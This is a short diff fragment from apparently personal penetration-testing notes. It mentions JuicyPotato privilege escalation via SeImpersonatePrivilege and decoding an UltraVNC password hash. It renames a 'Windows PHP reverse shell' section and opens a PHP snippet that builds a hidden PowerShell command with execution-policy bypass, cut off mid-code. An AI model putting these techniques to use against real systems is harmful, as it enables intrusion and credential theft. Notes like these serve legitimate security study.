@@ -31,7 +31,7 @@ Machine is x64-based PC. SeImpersonatePrivilege Enabled. User JuicyPotato.exe or
 Decody VNC password hash: upload vncpwd.exe to machine and run against ultravnc.ini Or on Kali run wine vncpwd.exe <Password-hash>
 
 
-Windows PHP reverse shell
+Windows PHP reverse shell (stable)
 ```bash
 <?php
 $cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ";
